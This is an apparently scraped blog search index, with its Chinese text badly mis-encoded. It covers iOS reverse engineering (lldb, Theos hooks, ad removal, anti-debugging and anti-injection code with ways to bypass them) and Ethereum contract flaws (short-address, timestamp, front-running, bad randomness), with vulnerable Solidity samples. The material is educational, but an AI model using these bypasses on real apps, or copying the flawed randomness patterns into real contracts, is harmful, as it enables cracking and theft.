è°ƒè¯•æŒ‡ä»¤ image list -o -f b -[xx xxx] br s -a 0xaaaaaa po $r0 p/x $r0 x/s $r1 register read memory read br list / br com add 1.1 : DONE xcodeè°ƒè¯• æ–°å»ºä¸appåŒåå·¥ç¨‹ è¿è¡Œè„šæœ¬ run å®‰è£…chisel or ä½¿ç”¨ MokeyDev Tip å®šä½buttonçš„actionäº‹ä»¶ ä¼ ç»Ÿ: [btn allTargets] //xxx [btn allControlEvents] //yyy [btn actionsForTarget:xxx forControlEvent:yyy] ä½¿ç”¨chisel: pviews pactions btn ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:16:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"Theos tweak æ‰§è¡Œ$THEOS/bin/nic.plåˆ›å»ºå·¥ç¨‹ ç¼–å†™hookä»£ç  ``` %hook ViewController -(void)clickme:(id)sender{ NSLog(@\"Click me hooked !!!\"); %log; %orig; //æ‰§è¡ŒåŸæ–¹æ³• } %end ``` ç¼–è¯‘ * make * make package * make install iOSOpenDevï¼ˆ13å¹´æ²¡æ›´æ–°äº†ï¼‰ MonkeyDev æŸ¥çœ‹Logè¾“å‡º å®‰è£…libimobiledeviceå·¥å…·(éœ€è¦usbmuxd): brew install --HEAD libimobiledevice ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹è¾“å‡ºLog: idevicesyslog | grep 'xxx' æˆ–è€…ä½¿ç”¨è‡ªå¸¦çš„ console.app ç¨‹åºæŸ¥çœ‹ã€‚ ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:17:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"Oplayer lite å»å¹¿å‘Š ä½¿ç”¨frida-ios-dumpç ¸å£³ ç”¨class-dumpå¯¼å‡ºå¤´æ–‡ä»¶ ç”¨revealå®šä½å¹¿å‘Šview ç”¨xcode lldbè°ƒè¯•æ‰¾åˆ°å¹¿å‘Šçš„addSubview:è°ƒç”¨ä½ç½® ä½¿ç”¨hooperé™æ€åˆ†æé€»è¾‘ ç”¨Theoså†™æ’ä»¶æ”¹å˜é€»è¾‘å»å¹¿å‘Š ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:18:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"SnapChat æ¶ˆæ¯ Tip ä½¿ç”¨cycriptæˆ–è€…revealæ‰¾åˆ°viewå¯¹åº”çš„viewcontroller é€šè¿‡theosçš„logify.pl hookä¸€ä¸ªç±»æ‰€æœ‰æ–¹æ³•æ‰¾åˆ°å…·ä½“è°ƒç”¨ é€šè¿‡lldbæ‰“å°å…·ä½“è°ƒç”¨çš„æ‰§è¡Œå †æ ˆ â€“ bt tweakæ‰¾ä¸åˆ°ç±»å¯ä»¥é€šè¿‡å£°æ˜@class xxxè§£å†³ ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:19:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"è¿ç§»åˆ°éè¶Šç‹±è®¾å¤‡ ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:20:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"Frida ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:21:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"æ•°æ®åŠ å¯† å­—ç¬¦ä¸²åŠ å¯† æ•°æ®å­˜å‚¨åŠ å¯† ç½‘ç»œæ•°æ®åŠ å¯† ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:22:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"åè°ƒè¯•ä¸åæ³¨å…¥ åè°ƒè¯• ptrace ptrace(PT_DENY_ATTACH, 0, 0, 0); void *handle = dlopen(0, RTLD_GLOBAL | RTLD_NOW); ptrace_ptr_t ptrace_ptr = (ptrace_ptr_t)dlsym(handle, \"ptrace\"); ptrace_ptr(PT_DENY_ATTACH, 0, 0, 0); sysctl ä½¿ç”¨sysctlè·å–å½“å‰è¿›ç¨‹ï¼Œæ ‡å¿—ä½p_flagå¯¹æ¯”P_TRACED BOOL isDebuggerPresent(){ int name[4]; struct kinfo_proc info; size_t info_size = sizeof(info); info.kp_proc.p_flag = 0; name[0] = CTL_KERN; name[1] = KERN_PROC; name[2] = KERN_PROC_PID; name[3] = getpid(); if(sysctl(name, 4, \u0026info, \u0026info_size, NULL, 0) == -1){ NSLog(@\"sysctl error...\"); return NO; } return ((info.kp_proc.p_flag \u0026 P_TRACED) != 0); } syscall syscall(26, 31 , 0, 0, 0); ååè°ƒè¯• é€šè¿‡fish hook hook ptrace hook dlsym hook syscall hook sysctl åæ³¨å…¥ ç¼–è¯‘åŠ å…¥æ ‡å¿—ä½ -Wl,-sectcreate,__RESTRICT,__restrict,/dev/null åŸç†ï¼Œå¢åŠ __RESTRICTè¿™ä¸ªsection dylibçš„æ³¨å…¥ä¸€èˆ¬æ˜¯é€šè¿‡DYLD_INSERT_LIBRARIESè¿™ä¸ªç¯å¢ƒå˜é‡æ¥å®ç°çš„ï¼Œåœ¨dyldæºç ä¸­ï¼š case restrictedBySegment: dyld::log(\"main executable (%s) has __RESTRICT/__restrict section\\n\", sExecPath); break; æ•…å­˜åœ¨è¯¥åˆ†æ®µå³å¯å¿½ç•¥DYLD_å¼€å¤´çš„ç¯å¢ƒå˜é‡ï¼Œä»è€Œé˜²æ­¢dylibæ³¨å…¥ã€‚ æ£€æµ‹åŠ è½½åŠ¨æ€åº“è·¯å¾„ä¸­æ˜¯å¦æœ‰DynamicLibrariesï¼ˆæµ‹è¯•æ²¡ç”¨ï¼‰ BOOL isInjected0(){ int count = _dyld_image_count(); if(count \u003e 0){ for(int i=0; i\u003ccount; i++){ const char* dyld = _dyld_get_image_name(i); if(strstr(dyld, \"DynamicLibraries\")){ return YES; } } return NO; } return NO; } æ£€æµ‹æ˜¯å¦å­˜åœ¨ç¯å¢ƒå˜é‡DYLD_INSERT_LIBRARIESï¼ˆæµ‹è¯•æœ‰ç”¨ï¼‰ BOOL isInjected1(){ char* env = getenv(\"DYLD_INSERT_LIBRARIES\"); if(env) return YES; return NO; } ååæ³¨å…¥ ä¿®æ”¹mach-oæ–‡ä»¶ä¸­__RESTRICTå­—æ®µä¸­restrictå­—ç¬¦ä¸²ä¸ºå…¶ä»–å­—ç¬¦ä¸² ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:23:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"æ··æ·† ç±»åå’Œæ–¹æ³•åæ··æ·† å®å®šä¹‰æ›¿æ¢ ios-class-guard ç›´æ¥æ›¿æ¢MachOæ–‡ä»¶ ä¿®æ”¹ __objc_classname ä¿®æ”¹ __objc_methname OLLVM â€‹ ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:24:0","tags":["iOS"],"title":"iOSé€†å‘ç¬”è®°","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["åŒºå—é“¾"],"content":"åŒºå—é“¾å®‰å…¨äº‘è¯ çˆ¬è™«ï¼šscrapy æ•°æ®åº“ï¼špostgresql åˆ†è¯ï¼šjieba è¯é¢‘ï¼špyè„šæœ¬ï¼ˆæ³¨æ„æ•°æ®æ¸…æ´—) äº‘è¯ï¼šwordart å­—ä½“ï¼šAaè·åŒ…é¼“é¼“ ","date":"2018-08-23","objectID":"/posts/blockchain-wordcloud.html:0:0","tags":["BlockChain"],"title":"Blockchain WordCloud","uri":"/posts/blockchain-wordcloud.html"},{"categories":["åŒºå—é“¾"],"content":"0x00 Info çŸ­åœ°å€æ”»å‡»æ˜¯DASP TOP10ä¸­è¯¦ç»†æè¿°çš„æœ€åä¸€ç±»æ¼æ´ã€‚è¿™ä¸ªæ¼æ´å…¶å®å¯ä»¥å½’ç»“äºè¿‡å»EVMçš„ç¼ºé™·ã€‚ ","date":"2018-08-20","objectID":"/posts/dasp-short-addresses-9.html:1:0","tags":["BlockChain","DASP"],"title":"#DASP# Short Addresses (9)","uri":"/posts/dasp-short-addresses-9.html"},{"categories":["åŒºå—é“¾"],"content":"0x01 åŸºç¡€çŸ¥è¯† Quote The Contract Application Binary Interface (ABI) is the standard way to interact with contracts in the Ethereum ecosystem, both from outside the blockchain and for contract-to-contract interaction. åœ¨EVMè™šæ‹Ÿæœºä¸­åˆçº¦æ˜¯é€šè¿‡ABIæ¥å£è¿›è¡Œäº¤äº’ï¼Œæ•°æ®å’Œæ–¹æ³•éƒ½æ ¹æ®ç‰¹å®šæ ‡å‡†è¿›è¡Œç¼–è§£ç ã€‚å…·ä½“å‚è§Contract ABI Specificationã€‚ å¦‚ä½•é€šè¿‡ABIè°ƒç”¨åˆçº¦æ–¹æ³•ï¼Ÿæ–¹æ³•å’Œæ•°æ®å¦‚ä½•ç¼–ç ï¼Ÿæˆ‘ä»¬ä¸¾ä¾‹ï¼ˆç»å…¸Tokenåˆçº¦ï¼‰æ¥è¯´æ˜ï¼š contract MyToken { mapping (address =\u003e uint) balances; event Transfer(address indexed _from, address indexed _to, uint256 _value); function MyToken() { balances[tx.origin] = 10000; } function sendCoin(address to, uint amount) returns(bool sufficient) { if (balances[msg.sender] \u003c amount) return false; balances[msg.sender] -= amount; balances[to] += amount; Transfer(msg.sender, to, amount); return true; } function getBalance(address addr) constant returns(uint) { return balances[addr]; } } å¦‚æœæˆ‘ä»¬æƒ³è½¬å¸åˆ°å…¶ä»–åœ°å€ï¼Œä¼šå¤–éƒ¨è°ƒç”¨sendCoin()æ–¹æ³•ï¼Œåˆ™åˆ›å»ºäº¤æ˜“åæŸ¥çœ‹inputæ•°æ®å¦‚ä¸‹ï¼š å±•å¼€ä¸ºï¼š 0x90b98a11 æ–¹æ³•ç­¾åçš„hashå€¼ï¼Œ4ä¸ªå­—èŠ‚ï¼Œé€šè¿‡Keccak(sendCoin(address, uint))è®¡ç®—å¾—åˆ° 00000000000000000000000062bec9abe373123b9b635b75608f94eb8644163e â€˜toâ€™åœ°å€ï¼Œ20ä¸ªå­—èŠ‚ï¼Œå¡«å……å‰å¯¼0ï¼ˆ12å­—èŠ‚ï¼‰è‡³32å­—èŠ‚ 0000000000000000000000000000000000000000000000000000000000000002 â€˜amountâ€™æ•°é‡ï¼Œ1å­—èŠ‚æ— ç¬¦å·æ•´å‹ï¼Œå¡«å……å‰å¯¼0ï¼ˆ31å­—èŠ‚ï¼‰è‡³32å­—èŠ‚ inputå°±æ˜¯ä¸€ç¬”å®Œæ•´çš„äº¤æ˜“æ•°æ®ã€‚ ","date":"2018-08-20","objectID":"/posts/dasp-short-addresses-9.html:2:0","tags":["BlockChain","DASP"],"title":"#DASP# Short Addresses (9)","uri":"/posts/dasp-short-addresses-9.html"},{"categories":["åŒºå—é“¾"],"content":"0x02 æ”»å‡»åˆ©ç”¨ 17å¹´Golemå›¢é˜Ÿå‘ç°ä¸€ç¬”å¯ç–‘çš„GNTäº¤æ˜“ï¼Œä»è€Œå‘ç°äº†çŸ­åœ°å€æ¼æ´ã€‚How to Find $10M Just by Reading the Blockchainä¸€æ–‡ä¸­è¯¦ç»†æè¿°äº†æ¼æ´çš„å‘ç°å’Œåˆ©ç”¨ã€‚ æˆ‘ä»¬è¿˜æ˜¯ä»¥ä¸Šé¢çš„ä¾‹å­åˆ†æä¸‹æ¼æ´æˆå› ã€‚ Question EVMå’Œåˆçº¦å¦‚æœæœªæ ¡éªŒç”¨æˆ·è¾“å…¥ä¼šäº§ç”Ÿä»€ä¹ˆæ•ˆæœï¼Ÿ æˆ‘ä»¬æŠŠâ€™toâ€™åœ°å€çš„32å­—èŠ‚æœ€å1å­—èŠ‚å»æ‰ï¼Œå˜æˆ0x62bec9abe373123b9b635b75608f94eb864416ï¼Œé‚£æ­¤æ—¶inputæ•°æ®å°±ä¼šå˜æˆï¼š 0x90b98a11 00000000000000000000000062bec9abe373123b9b635b75608f94eb86441600 00000000000000000000000000000000000000000000000000000000000002 ç¬¬ä¸€ä¸ªå‚æ•°ä¸è¶³32å­—èŠ‚ä¼šä»ç¬¬äºŒå‚æ•°é«˜ä½å–0è¡¥ä½ï¼Œè¿™æ ·ç¬¬äºŒä¸ªå‚æ•°å°±è¢«å·¦ç§»1å­—èŠ‚ï¼Œç›¸å½“äºamount * 256ã€‚ äº¤æ˜“ç¬é—´å˜æˆäº†: from: '0x8b349f26a49a45776a1ec0d0188e7a89367c8c5d', to: '0x62bec9abe373123b9b635b75608f94eb86441600', value: 512, è¯¥æ¼æ´èƒ½å¤ŸæˆåŠŸåˆ©ç”¨çš„å¤§å‰ææ˜¯ï¼š å¸å……è¶³ åœ¨æ„æˆinputæ•°æ®æ—¶ç”¨æˆ·çš„è¾“å…¥å’Œå¡«å……æ²¡æœ‰è¿›è¡Œæ ¡éªŒï¼ˆåœ¨remixä¸­å®éªŒå¤±è´¥å°±æ˜¯å› ä¸ºå·²ç»ä¸å…è®¸ä¼ å…¥éæ³•çŸ­åœ°å€äº†ï¼‰ ","date":"2018-08-20","objectID":"/posts/dasp-short-addresses-9.html:3:0","tags":["BlockChain","DASP"],"title":"#DASP# Short Addresses (9)","uri":"/posts/dasp-short-addresses-9.html"},{"categories":["åŒºå—é“¾"],"content":"0x00 Info å¦‚æœæ”»å‡»è€…æ‹¥æœ‰çŸ¿å·¥è§’è‰²ï¼Œåœ¨äº¤æ˜“æ‰“åŒ…æˆå—æ—¶ï¼ŒçŸ¿å·¥åœ¨ä¸€å®šèŒƒå›´æ˜¯å¯ä»¥æ“ä½œå—çš„æ—¶é—´æˆ³çš„ï¼Œè€Œæ°æ°åˆçº¦åˆ©ç”¨æ—¶é—´æˆ³ç”Ÿæˆé€»è¾‘ï¼ˆç‰¹åˆ«æ˜¯æ¶‰åŠåˆ°èµ„é‡‘äº¤æ˜“ï¼‰å°±ä¼šå­˜åœ¨Time manipulationé£é™©ã€‚ ","date":"2018-08-19","objectID":"/posts/dasp-time-manipulation-8.html:1:0","tags":["BlockChain","DASP"],"title":"#DASP# Time Manipulation (8)","uri":"/posts/dasp-time-manipulation-8.html"},{"categories":["åŒºå—é“¾"],"content":"0x01 Rules ä¸€ä¸ªåˆçº¦éœ€è¦ç”¨åˆ°â€œå½“å‰æ—¶é—´â€ï¼Œé€šå¸¸æ˜¯é€šè¿‡block.timestampæˆ–è€…nowæ¥å®ç°ï¼Œè€Œè¿™ä¸ªå€¼æ¥æºäºçŸ¿å·¥ï¼çŸ¿å·¥æ˜¯å¯ä»¥åœ¨å‡ ç§’å†…è°ƒæ•´è¿™ä¸ªæ—¶é—´æˆ³çš„ï¼Œä»è€Œä¸ºè‡ªå·±çš„åˆ©ç›Šæ”¹å˜åˆåŒçš„è¾“å‡ºã€‚ ä¾‹å¦‚ä¸€ä¸ªåˆçº¦ä½¿ç”¨æ—¶é—´æˆ³æ¥ç”Ÿæˆéšæœºæ•°ï¼ˆåœ¨exampleä¸­æœ‰å®ä¾‹ï¼‰ï¼ŒçŸ¿å·¥å¯ä»¥åœ¨åŒºå—è¢«éªŒè¯å30så†…å‘å¸ƒæ—¶é—´æˆ³ï¼Œä»è€Œåˆ©ç”¨è¿™30sçš„æ—¶é—´å¢åŠ è‡ªå·±è·åˆ©æ¦‚ç‡ã€‚ 30-second Rule çŸ¿å·¥å¯ä»¥æ”¹å˜åŒºå—çš„æ—¶é—´æˆ³ ä»…é™äºè¢«éªŒè¯åçš„30s å½“å‰å—çš„æ—¶é—´æˆ³ä¸èƒ½å°äºå‰ä¸€å—çš„æ—¶é—´æˆ³ ä½†æ˜¯ä¸€ä¸ªåˆçº¦å…·å¤‡ä»¥ä¸‹ç‰¹æ€§ï¼Œæ˜¯å¯ä»¥å®‰å…¨ä½¿ç”¨æ—¶é—´æˆ³çš„ï¼š Quote If the smart contract function can tolerate a 30-second time period, itâ€™s safe to use timestamp; If the scale of a time-dependent event can vary by 30 seconds and maintain integrity, itâ€™s also safe to use a block timestamp. ","date":"2018-08-19","objectID":"/posts/dasp-time-manipulation-8.html:2:0","tags":["BlockChain","DASP"],"title":"#DASP# Time Manipulation (8)","uri":"/posts/dasp-time-manipulation-8.html"},{"categories":["åŒºå—é“¾"],"content":"0x02 Examples å‰ä¸¤ä¸ªå®ä¾‹åˆçº¦ä¸»è¦åˆ©ç”¨block.timestampæ¥ç”Ÿæˆéšæœºæ•°ï¼Œè€Œåœ¨#DASP# Bad Randomnessä¸€æ–‡ä¸­æˆ‘ä»¬è¯¦ç»†ä»‹ç»äº†è¿™ç§éšæœºæ•°ç”Ÿæˆçš„ç¼ºé™·ã€‚ ","date":"2018-08-19","objectID":"/posts/dasp-time-manipulation-8.html:3:0","tags":["BlockChain","DASP"],"title":"#DASP# Time Manipulation (8)","uri":"/posts/dasp-time-manipulation-8.html"},{"categories":["åŒºå—é“¾"],"content":"theRun Source Code uint256 constant private salt = block.timestamp; function random(uint Max) constant private returns (uint256 result){ //get the best seed for randomness uint256 x = salt * 100/Max; uint256 y = salt * block.number/(salt % 5) ; uint256 seed = block.number/3 + (salt % 300) + Last_Payout + y; uint256 h = uint256(block.blockhash(seed)); return uint256((h / x)) % Max + 1; //random number between 1 and Max } theRunåˆçº¦ä½¿ç”¨block.timestampä½œä¸ºéšæœºæ•°ç§å­ï¼Œè€ŒçŸ¿å·¥å®Œå…¨å¯ä»¥åœ¨30så†…è®¡ç®—ä¸€ä¸ªåˆ©äºè·èƒœçš„éšæœºæ•°ã€‚ ","date":"2018-08-19","objectID":"/posts/dasp-time-manipulation-8.html:3:1","tags":["BlockChain","DASP"],"title":"#DASP# Time Manipulation (8)","uri":"/posts/dasp-time-manipulation-8.html"},{"categories":["åŒºå—é“¾"],"content":"EtherLotto Source Code // Compute some *almost random* value for selecting winner from current transaction. var random = uint(sha3(block.timestamp)) % 2; EtherLottoåˆçº¦éšæœºæ•°çš„è®¡ç®—å°±æ›´ç®€å•ç²—æš´äº†ï¼Œç›´æ¥ä½¿ç”¨block.timestampåšhashã€‚ ","date":"2018-08-19","objectID":"/posts/dasp-time-manipulation-8.html:3:2","tags":["BlockChain","DASP"],"title":"#DASP# Time Manipulation (8)","uri":"/posts/dasp-time-manipulation-8.html"},{"categories":["åŒºå—é“¾"],"content":"Governmental Source Code åœ¨#DASP# Denial of Serviceså¼€ç¯‡ä¸­æˆ‘ä»¬ä»‹ç»è¿‡Governmentalåˆçº¦ï¼Œå…¶å­˜åœ¨é‡ç½®è¶…é•¿creditoråˆ—è¡¨æ—¶gasæº¢å‡ºå¯¼è‡´çš„DOSé—®é¢˜ï¼ˆæœªæ£€æŸ¥sendè¿”å›å€¼ï¼‰ã€‚ å¦‚æœæ”»å‡»è€…åŒæ—¶æ‹¥æœ‰çŸ¿å·¥èº«ä»½ï¼Œé‚£è¯¥åˆçº¦åŒæ ·å­˜åœ¨æ—¶é—´æˆ³ç¯¡æ”¹é£é™©ã€‚ æ¸¸æˆçš„è§„åˆ™ç©æ³•æˆ‘ä»¬å†ç®€å•ä»‹ç»ä¸‹ï¼Œæ”¿åºœåœ¨æœ€è¿‘12å°æ—¶å†…æ²¡æœ‰æ”¶åˆ°ä»»ä½•æŠ•èµ„äººæèµ ï¼Œåˆ™å°†å¥–é‡‘å‘ç»™æœ€åä¸€åæŠ•èµ„äººã€‚ æ¶æ„çš„çŸ¿å·¥ç”¨ä¿®æ”¹åçš„æ—¶é—´æˆ³ä¸ºä»–çš„äº¤æ˜“ç”Ÿæˆäº†ä¸€ä¸ªå—ï¼Œä»è€Œå»¶è¿Ÿäº†ä»–çš„äº¤æ˜“æˆä¸ºæœ€åçš„äº¤æ˜“ï¼Œè¿™æ ·ä»–å°±ä»åˆçº¦ä¸­èµ¢å¾—äº†èµ„é‡‘ã€‚ åœ¨A survey of attacks on Ethereum smart contractsä¸€æ–‡ä¸­ä»‹ç»äº†Governmentalåˆçº¦çš„ä¸‰ä¸ªæ”»å‡»æ–¹å¼ã€‚ ","date":"2018-08-19","objectID":"/posts/dasp-time-manipulation-8.html:3:3","tags":["BlockChain","DASP"],"title":"#DASP# Time Manipulation (8)","uri":"/posts/dasp-time-manipulation-8.html"},{"categories":["åŒºå—é“¾"],"content":"0x00 Info æœ¬ç¯‡ä»‹ç»DASPç¬¬ä¸ƒç§æ¼æ´ç±»å‹â€“å‰ç½®æ‰§è¡Œã€‚ å¯ä»¥ç†è§£ä¸ºå› ä¸ºåŒºå—é“¾æ˜¯å…¬å¼€ï¼Œå…¶ä»–ç”¨æˆ·æˆ–è€…åˆçº¦çš„äº¤æ˜“ä¿¡æ¯å‡é€æ˜å¯æŸ¥ï¼Œæ¶æ„ç”¨æˆ·å¯ä»¥åˆ©ç”¨è¿™äº›å·²çŸ¥ä¿¡æ¯åˆ¶é€ æœ‰åˆ©äºè‡ªå·±çš„äº¤æ˜“ï¼Œå¹¶é€šè¿‡æé«˜æ‰‹ç»­è´¹çš„æ–¹å¼æŠ¢å…ˆæ‰§è¡Œè·åˆ©ã€‚ å½“ç„¶ï¼Œåœ¨front-running-griefing-and-the-perils-of-virtual-settlementä¸­æè¿°ï¼Œå¦‚æœè¿™ä¸ªæ¶æ„ç”¨æˆ·æœ¬èº«åˆæ˜¯çŸ¿å·¥ï¼Œå¯ä»¥ä»»æ„å®‰æ’äº¤æ˜“å¹¶å®¡æŸ¥å…¶ä»–äººäº¤æ˜“ï¼Œä½¿è‡ªå·±åˆ©ç›Šæœ€å¤§åŒ–ã€‚ ","date":"2018-08-16","objectID":"/posts/dasp-front-running-7.html:1:0","tags":["BlockChain","DASP"],"title":"#DASP# Front Running (7)","uri":"/posts/dasp-front-running-7.html"},{"categories":["åŒºå—é“¾"],"content":"0x01 å®ä¾‹ ","date":"2018-08-16","objectID":"/posts/dasp-front-running-7.html:2:0","tags":["BlockChain","DASP"],"title":"#DASP# Front Running (7)","uri":"/posts/dasp-front-running-7.html"},{"categories":["åŒºå—é“¾"],"content":"LastIsMe Contract Source Code LastIsMeæ˜¯ä¸€ä¸ªlotteryæ¸¸æˆåˆçº¦ï¼Œåœ¨ä¸€ä¸ªæ¸¸æˆå›åˆï¼ˆä¸€å®šçš„åŒºå—æ•°å†…ï¼‰å‚ä¸è€…è´­ä¹°ä¸€å¼ ç¥¨è®¤é¢†æœ€åä¸€ä¸ªåº§ä½ï¼Œå›åˆç»“æŸæ—¶æœ€åä¸€ä¸ªå°±åçš„ç©å®¶ä¼šè·å¾—å¤´å¥–ã€‚ æ”»å‡»è€…å¯ä»¥åœ¨å›åˆå¿«ç»“æŸæ—¶è§‚å¯Ÿå…¶ä»–ç©å®¶çš„äº¤æ˜“æ± ï¼Œé€šè¿‡æé«˜gasæ¥æŒ¤æ‰å…¶ä»–ç©å®¶çš„äº¤æ˜“ä»è€Œè·å¾—å¥–é‡‘ã€‚ ","date":"2018-08-16","objectID":"/posts/dasp-front-running-7.html:2:1","tags":["BlockChain","DASP"],"title":"#DASP# Front Running (7)","uri":"/posts/dasp-front-running-7.html"},{"categories":["åŒºå—é“¾"],"content":"ICO Contract Source Code ICOæœ¬èº«æ˜¯ä¸€é“CTFé¢˜ï¼Œå®ƒåŒ…å«ä¸€ä¸ªDAPPç½‘ç«™å’Œä¸å…¶äº¤äº’çš„ä¸¤ä¸ªåˆçº¦ï¼ˆHaCoin \u0026 ICOï¼‰ï¼Œéƒ¨ç½²åœ¨rinkebyæµ‹è¯•é“¾ä¸Šã€‚ HaCoinæ˜¯ä¸€ä¸ªTokenåˆçº¦ï¼Œæ¯”èµ›çš„ç›®æ ‡ä¹Ÿæ˜¯ä»è¯¥åˆçº¦ä¸­è·å–è¶…è¿‡31337æšHackCoinï¼Œè€Œè¿™ä¸ªåˆçº¦æœ¬èº«å¹¶æ²¡æœ‰é—®é¢˜ï¼Œéœ€è¦é…åˆWebç½‘ç«™å­˜åœ¨çš„XSSæ¼æ´æ¥ææƒï¼Œæ‰èƒ½è¿›è¡Œè½¬å¸æ“ä½œã€‚å¾ˆæœ‰æ„æ€ï¼Œå…·ä½“writeupå‚è§ZeroNights ICO Hacking Contest Writeupã€‚ è€Œå¦ä¸€ä¸ªåˆçº¦ICOæ˜¯ä¸€ä¸ªlotteryåˆçº¦ï¼Œæ¸¸æˆè§„åˆ™ä¹Ÿå¾ˆç®€å•ï¼Œ5ä¸ªå—ä¸ºä¸€å›åˆï¼Œå›åˆå†…å‚ä¸è€…çŒœä¸€ä¸ªæ•°å­—ï¼Œå›åˆç»“æŸæ—¶æœºå™¨äººä¼šéšæœºæŠ›å‡ºä¸€ä¸ªæ•°å­—ï¼Œå¦‚æœè°çŒœä¸­è°å°±è·èƒœã€‚è€Œè¯¥åˆçº¦å­˜åœ¨å‰ç½®æ‰§è¡Œæ¼æ´ã€‚ function spinLottery(uint number) public { if (msg.sender != robotAddress) { playerNumber[msg.sender] = number; players.push(msg.sender); NewLotteryBet(msg.sender); } else { require(block.number - lotteryBlock \u003e 5); lotteryBlock = block.number; for (uint i = 0; i \u003c players.length; i++) { if (playerNumber[players[i]] == number) { desires[players[i]].active = true; desires[players[i]].email = \"*Use changeEmail func to set your email.*\"; Proposal(players[i], desires[players[i]].email); } } delete players; // flushing round NewLotteryRound(lotteryBlock); } } æœºå™¨äººå‘å¸ƒçš„éšæœºæ•°æ˜æ–‡æäº¤åˆ°äº¤æ˜“æ± ï¼Œå¦‚æœæ”»å‡»è€…èƒ½å¤Ÿè¶³å¤Ÿå¿«çš„æ£€ç´¢pendingäº¤æ˜“å¹¶æ‰¾åˆ°è¯¥éšæœºæ•°ï¼Œç„¶åä½¿ç”¨è¯¥éšæœºæ•°å‚ä¸æ¸¸æˆï¼Œä¿è¯ä¸¤ç¬”äº¤æ˜“åœ¨åŒä¸€ä¸ªå—ä¸­ï¼Œå¹¶æé«˜gasåœ¨æœºå™¨äººå‘å¸ƒéšæœºæ•°çš„äº¤æ˜“ä¹‹å‰æ‰§è¡Œï¼Œå°±èƒ½è·èƒœã€‚ ","date":"2018-08-16","objectID":"/posts/dasp-front-running-7.html:2:2","tags":["BlockChain","DASP"],"title":"#DASP# Front Running (7)","uri":"/posts/dasp-front-running-7.html"},{"categories":["åŒºå—é“¾"],"content":"BancorFormula Contract Source Code è¯¦ç»†åˆ†æï¼šImplementing Ethereum trading front-runs on the Bancor exchange in Python ","date":"2018-08-16","objectID":"/posts/dasp-front-running-7.html:2:3","tags":["BlockChain","DASP"],"title":"#DASP# Front Running (7)","uri":"/posts/dasp-front-running-7.html"},{"categories":["åŒºå—é“¾"],"content":"0x00 Info ç»å¯¹çš„éšæœºåœ¨Ethereumä¸­å¾ˆéš¾å®ç°ï¼Œå› ä¸ºæ‰€æœ‰å‚æ•°éƒ½å¯ä»¥åœ¨é€æ˜çš„é“¾ä¸ŠæŸ¥è¯¢ï¼Œå› æ­¤æƒ³è¦åˆ©ç”¨éšæœºç‰¹æ€§ç”Ÿæˆé€»è¾‘å¾ˆå®¹æ˜“å‡ºç°bugï¼Œæœ¬ç¯‡å°±ä»‹ç»DASPä¸­ç¬¬å…­ç±»æ¼æ´â€“ä¸å®‰å…¨çš„éšæœºæ€§ã€‚ ","date":"2018-08-09","objectID":"/posts/dasp-bad-randomness-6.html:1:0","tags":["BlockChain","DASP"],"title":"#DASP# Bad Randomness (6)","uri":"/posts/dasp-bad-randomness-6.html"},{"categories":["åŒºå—é“¾"],"content":"0x01 é”™è¯¯å®è·µ Solidityæœ¬èº«æä¾›ä¸€äº›è·å–â€œéšæœºå€¼â€çš„æ–¹æ³•å’Œå˜é‡ï¼Œä½ å¯ä»¥åœ¨å®˜æ–¹æ–‡æ¡£ä¸­æŸ¥çœ‹ã€‚ä½†æ˜¯è¿™äº›â€œéšæœºå€¼â€ï¼ˆåœ¨é“¾ä¸Šå…¬å¼€ï¼‰å¦‚æœä¸å½“çš„ä½œä¸ºç”Ÿæˆéšæœºæ•°çš„å› å­æˆ–ç§å­ï¼Œé‚£éšæœºæ•°å°±å¯ä»¥è¢«é¢„æµ‹ã€‚ æ ¹æ®DASPæä¾›çš„å®ä¾‹æˆ‘ä»¬çœ‹çœ‹æœ‰å“ªäº›å‘ã€‚ ç¬¬ä¸€ç§ uint256 private seed; function play() public payable { require(msg.value \u003e= 1 ether); iteration++; uint randomNumber = uint(keccak256(seed + iteration)); if (randomNumber % 2 == 0) { msg.sender.transfer(this.balance); } } 